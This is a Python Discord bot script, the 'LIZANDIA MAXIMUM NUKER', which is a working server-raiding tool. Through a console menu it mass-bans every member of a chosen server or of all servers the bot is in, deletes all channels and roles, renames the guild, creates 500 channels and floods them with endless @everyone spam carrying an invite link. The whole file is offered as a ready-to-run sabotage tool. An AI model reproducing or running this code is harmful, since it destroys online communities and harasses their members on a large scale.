import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import aiohttp

os.system('cls' if os.name == 'nt' else 'clear')

# ============================================
# BANNER
# ============================================
print("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║     ██╗     ██╗███████╗ █████╗ ███╗   ██╗██████╗ ██╗ █████╗                          ║
║     ██║     ██║╚══███╔╝██╔══██╗████╗  ██║██╔══██╗██║██╔══██╗                         ║
║     ██║     ██║  ███╔╝ ███████║██╔██╗ ██║██║  ██║██║███████║                         ║
║     ██║     ██║ ███╔╝  ██╔══██║██║╚██╗██║██║  ██║██║██╔══██║                         ║
║     ███████╗██║███████╗██║  ██║██║ ╚████║██████╔╝██║██║  ██║                         ║
║     ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═╝                         ║
║                                                                                       ║
║                    ╔═══════════════════════════════════════════════════════════════╗  ║
║                    ║              LIZANDIA MAXIMUM NUKER v7.0                      ║  ║
║                    ║         CONSOLE SELECTION - TYPE 'y' TO BAN ALL              ║  ║
║                    ╚═══════════════════════════════════════════════════════════════╝  ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# TOKEN INPUT
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN: ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# ============================================
# COLORS
# ============================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ============================================
# LIZANDIA MESSAGES
# ============================================
BAN_MESSAGE = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║                    ██╗     ██╗███████╗ █████╗ ███╗   ██╗██████╗ ██╗ █████╗    ║
║                    ██║     ██║╚══███╔╝██╔══██╗████╗  ██║██╔══██╗██║██╔══██╗   ║
║                    ██║     ██║  ███╔╝ ███████║██╔██╗ ██║██║  ██║██║███████║   ║
║                    ██║     ██║ ███╔╝  ██╔══██║██║╚██╗██║██║  ██║██║██╔══██║   ║
║                    ███████╗██║███████╗██║  ██║██║ ╚████║██████╔╝██║██║  ██║   ║
║                    ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═╝   ║
║                                                                               ║
║                                                                               ║
║                    🏆 LIZANDIA TOP - الباقي فوتوشوب 🏆                        ║
║                                                                               ║
║                    https://discord.gg/c7cgYk4V                                ║
║                                                                               ║
║                    YOU HAVE BEEN TERMINATED BY LIZANDIA TEAM                  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

SPAM_MESSAGES = [
    "@everyone **LIZANDIA TEAM DESTROYED THIS SERVER**",
    "```LIZANDIA - LIZANDIA - LIZANDIA```",
    "@everyone **LIZANDIA TOP - الباقي فوتوشوب**",
    "```TEAM LIZANDIA - MAXIMUM DESTRUCTION```",
    "**LIZANDIA JAK LMOT RA7 TARJ3 LOT HHHH**",
    "@everyone **BYE BYE SERVER - LIZANDIA**",
    "```POWERED BY LIZANDIA```",
    "@everyone **https://discord.gg/c7cgYk4V**",
]

WEBHOOK_NAMES = ["LIZANDIA", "TEAM-LIZANDIA", "LIZANDIA-NUKER"]
CHANNEL_NAMES = ["LIZANDIA", "LIZANDIA-TEAM", "LIZANDIA-POWER", "LIZANDIA-HERE"]

# ============================================
# BAN ALL MEMBERS FUNCTION
# ============================================
async def ban_all_members(guild, channel=None):
    """Ban all members with LIZANDIA message"""
    
    print(f"\n{Colors.BOLD}{Colors.RED}[!] BANNING ALL MEMBERS IN: {guild.name}{Colors.RESET}")
    
    # Get all members correctly
    members = []
    async for member in guild.fetch_members(limit=None):
        members.append(member)
    
    total_humans = len([m for m in members if not m.bot])
    banned = 0
    
    for member in members:
        if not member.bot:
            try:
                # Send ban message first
                try:
                    await member.send(BAN_MESSAGE)
                    await asyncio.sleep(0.1)
                except:
                    pass
                
                # Ban the member
                await member.ban(reason="LIZANDIA TEAM - BANNED", delete_message_days=7)
                banned += 1
                
                if banned % 10 == 0:
                    print(f"    • BANNED {banned}/{total_humans}")
                    if channel:
                        try:
                            await channel.send(f"**LIZANDIA BANNED {banned}/{total_humans} MEMBERS**")
                        except:
                            pass
                
                await asyncio.sleep(0.05)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ BANNED {banned} MEMBERS{Colors.RESET}")
    if channel:
        try:
            await channel.send(f"**✅ LIZANDIA BANNED {banned} MEMBERS**")
        except:
            pass
    
    return banned

# ============================================
# FULL NUKE FUNCTION
# ============================================
async def full_nuke(guild, channel):
    """Complete server destruction"""
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}[!] LIZANDIA FULL NUKE STARTED ON: {guild.name}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    
    start_time = time.time()
    
    # PHASE 1: BAN ALL MEMBERS
    print(f"{Colors.CYAN}[1/5] BANNING ALL MEMBERS...{Colors.RESET}")
    if channel:
        try:
            await channel.send("```🔥 LIZANDIA - BANNING ALL MEMBERS 🔥```")
        except:
            pass
    
    banned = await ban_all_members(guild, channel)
    
    # PHASE 2: CREATE WEBHOOKS
    print(f"{Colors.CYAN}[2/5] CREATING WEBHOOKS...{Colors.RESET}")
    if channel:
        try:
            await channel.send("**🪝 CREATING LIZANDIA WEBHOOKS**")
        except:
            pass
    
    webhooks = []
    text_channels = []
    for ch in guild.text_channels:
        text_channels.append(ch)
        if len(text_channels) >= 10:
            break
    
    for ch in text_channels:
        for i in range(3):
            try:
                webhook = await ch.create_webhook(name=f"LIZANDIA-{i}")
                webhooks.append(webhook)
                await asyncio.sleep(0.1)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ CREATED {len(webhooks)} WEBHOOKS{Colors.RESET}")
    
    # PHASE 3: DELETE ALL CHANNELS
    print(f"{Colors.CYAN}[3/5] DELETING ALL CHANNELS...{Colors.RESET}")
    for ch in guild.channels:
        try:
            await ch.delete(reason="LIZANDIA")
            await asyncio.sleep(0.02)
        except:
            pass
    
    # PHASE 4: DELETE ALL ROLES
    print(f"{Colors.CYAN}[4/5] DELETING ALL ROLES...{Colors.RESET}")
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete(reason="LIZANDIA")
                await asyncio.sleep(0.02)
            except:
                pass
    
    # PHASE 5: RENAME & CREATE NEW CHANNELS
    print(f"{Colors.CYAN}[5/5] RENAMING & CREATING 500 CHANNELS...{Colors.RESET}")
    
    new_name = random.choice(["LIZANDIA", "TEAM LIZANDIA", "LIZANDIA-TOP"])
    try:
        await guild.edit(name=new_name)
    except:
        pass
    
    # Create 500 channels
    for i in range(500):
        try:
            await guild.create_text_channel(name=f"{random.choice(CHANNEL_NAMES)}-{i}")
            if i % 100 == 0 and i > 0:
                print(f"    • CREATED {i} CHANNELS")
            await asyncio.sleep(0.01)
        except:
            pass
    
    print(f"{Colors.GREEN}    ✓ CREATED 500 CHANNELS{Colors.RESET}")
    
    # Start infinite spam
    async def spam():
        while True:
            for ch in guild.text_channels:
                try:
                    await ch.send(random.choice(SPAM_MESSAGES))
                    await asyncio.sleep(0.05)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    asyncio.create_task(spam())
    
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}[✓] LIZANDIA NUKE COMPLETED!{Colors.RESET}")
    print(f"{Colors.GREEN}    • BANNED: {banned} MEMBERS")
    print(f"{Colors.GREEN}    • WEBHOOKS: {len(webhooks)}")
    print(f"{Colors.GREEN}    • CHANNELS: 500 CREATED")
    print(f"{Colors.GREEN}    • TIME: {total_time} SECONDS")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")

# ============================================
# SHOW SERVERS
# ============================================
def show_servers():
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.YELLOW}{' ' * 20}📋 AVAILABLE SERVERS{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*60}{Colors.RESET}\n")
    
    guilds = list(bot.guilds)
    for i, guild in enumerate(guilds, 1):
        members = len(guild.members)
        print(f"{Colors.GREEN}[{i}]{Colors.RESET} {Colors.WHITE}{guild.name}{Colors.RESET}")
        print(f"     ├─ 🆔 ID: {guild.id}")
        print(f"     └─ 👥 Members: {members}\n")
    
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*60}{Colors.RESET}")

# ============================================
# MAIN MENU
# ============================================
async def main_menu():
    print(f"\n{Colors.BOLD}{Colors.YELLOW}🎯 LIZANDIA NUKE - CONSOLE CONTROL{Colors.RESET}")
    show_servers()
    
    print(f"{Colors.CYAN}OPTIONS:{Colors.RESET}")
    print(f"  {Colors.GREEN}[1-{len(bot.guilds)}]{Colors.RESET} - Select server number to nuke")
    print(f"  {Colors.GREEN}[y]{Colors.RESET} - Ban all members in ALL servers (with LIZANDIA message)")
    print(f"  {Colors.GREEN}[q]{Colors.RESET} - Quit")
    
    choice = input(f"\n{Colors.YELLOW}📌 ENTER CHOICE: {Colors.RESET}").lower()
    
    if choice == 'q':
        return None, None
    
    elif choice == 'y':
        return 'all', None
    
    else:
        try:
            server_num = int(choice)
            if 1 <= server_num <= len(bot.guilds):
                guilds_list = list(bot.guilds)
                return guilds_list[server_num - 1], None
            else:
                print(f"{Colors.RED}❌ INVALID NUMBER!{Colors.RESET}")
                return None, None
        except:
            print(f"{Colors.RED}❌ INVALID INPUT!{Colors.RESET}")
            return None, None

# ============================================
# ON READY
# ============================================
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(f"""
{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ LIZANDIA BOT ONLINE: {bot.user.name}{' ' * (28 - len(bot.user.name))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ID: {bot.user.id}{' ' * (44 - len(str(bot.user.id)))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ SERVERS: {len(bot.guilds)}{' ' * (43 - len(str(len(bot.guilds))))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              🚀 LIZANDIA MAXIMUM NUKER IS READY                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              📌 ENTER NUMBER TO SELECT SERVER OR 'y' TO BAN ALL               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    target, _ = await main_menu()
    
    if target == 'all':
        print(f"\n{Colors.RED}{Colors.BOLD}⚠️  YOU ARE ABOUT TO BAN ALL MEMBERS IN ALL SERVERS!{Colors.RESET}")
        confirm = input(f"{Colors.YELLOW}TYPE 'LIZANDIA' TO CONFIRM: {Colors.RESET}")
        
        if confirm.upper() == 'LIZANDIA':
            for guild in bot.guilds:
                await ban_all_members(guild, None)
            print(f"\n{Colors.GREEN}✅ BANNED ALL MEMBERS IN ALL SERVERS!{Colors.RESET}")
        else:
            print(f"{Colors.RED}❌ CANCELLED!{Colors.RESET}")
    
    elif target:
        print(f"\n{Colors.RED}{Colors.BOLD}🔥 STARTING FULL NUKE ON: {target.name}{Colors.RESET}")
        confirm = input(f"{Colors.YELLOW}TYPE 'LIZANDIA' TO CONFIRM: {Colors.RESET}")
        
        if confirm.upper() == 'LIZANDIA':
            # Get first channel to send updates
            first_channel = None
            for ch in target.text_channels:
                first_channel = ch
                break
            
            await full_nuke(target, first_channel)
        else:
            print(f"{Colors.RED}❌ CANCELLED!{Colors.RESET}")
    
    await bot.close()

# ============================================
# RUN
# ============================================
bot.run(TOKEN)
